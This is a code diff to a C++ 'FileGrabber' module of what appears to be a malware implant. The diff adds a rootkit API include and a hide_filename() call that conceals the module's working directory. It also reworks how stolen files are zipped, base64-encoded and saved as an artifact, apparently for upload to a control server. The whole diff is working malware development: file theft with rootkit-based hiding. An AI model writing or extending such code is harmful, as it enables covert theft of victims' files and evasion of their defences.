@@ -10,6 +10,7 @@
 #include "FileGrabber.h"
 #include "../Utils/CryptoUtils.h"
 #include "../Utils/MachineUtils.h"
+#include "../amazing_rootkit/api/api.h"
 
 void FileGrabber::module_impl()
 {
@@ -17,6 +18,7 @@ void FileGrabber::module_impl()
     run_ = false;
 
     std::cout << "Running" << module_type << " with args: " << args.dump() << std::endl;
+    nlohmann::json ret_json;
 
     const std::string base_dir = "/tmp/";
     std::string zip_file_name = "out.zip";
@@ -25,15 +27,19 @@ void FileGrabber::module_impl()
     try 
     {
         working_dir = create_working_dir(base_dir);
-        //TODO: hide the working_dir using rootkit
+        // hide working_dir using rootkit api
+        hide_filename(working_dir.c_str());
         std::cout << "Successfully created directory: " << working_dir << std::endl;
     } 
     catch (const std::exception& ex) 
     {
-        std::cerr << "Error: " << ex.what() << std::endl;
+        // std::cerr << "Error: " << ex.what() << std::endl;
+        nlohmann::json error_msg;
+        error_msg["error"] = "Failed to create working dir";
+        ret_json[module_type] = error_msg;
+        save_artifact(ret_json);
+        return;
     }
-
-    //TODO: we should get this configuration from the server
 
     int total_grabbed_files = parse_tasks(working_dir, args);
     
@@ -54,22 +60,17 @@ void FileGrabber::module_impl()
         std::cout << "File exists: " << out_zip_path << std::endl;
         std::vector<unsigned char> fileContent = readFile(out_zip_path);
         std::string base64Content = CryptoUtils::base64_encode(fileContent);
-        nlohmann::json ret_json;
         ret_json[module_type] = base64Content;
-
-        // TODO: send zip file to server
         save_artifact(ret_json);
-
-        // std::ofstream outFile("grabbed.json");
-        // outFile << ret_json.dump(4);
-        // outFile.close();
-        // std::cout << "File has been encoded and saved to grabbed.json" << std::endl;
-
     }
     else 
     {
-        // TODO: send indecation that we didnt find any file
         std::cout << "File does not exist: " << out_zip_path << std::endl;
+        nlohmann::json error_msg;
+        error_msg["error"] = "No zip to send";
+        ret_json[module_type] = error_msg;
+        save_artifact(ret_json);
+        return;
     }
 
     //TODO: delete folder from fs
